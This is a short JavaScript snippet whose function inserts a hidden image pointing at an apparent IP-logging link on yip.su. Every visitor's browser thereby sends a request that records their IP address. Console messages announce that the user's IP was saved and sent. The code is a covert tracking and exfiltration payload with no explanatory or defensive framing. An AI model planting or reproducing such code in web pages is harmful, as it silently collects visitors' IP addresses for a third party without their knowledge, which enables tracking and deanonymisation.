

function loadLogger(url) {
  var image = new Image();
  image.onload = function() {
    console.log('Saved user ip');
  };
  image.src = url;
  image.style.display = 'none'; 
}

loadLogger('https://yip.su/RN5Cp1');
console.log("ip-data has been send");
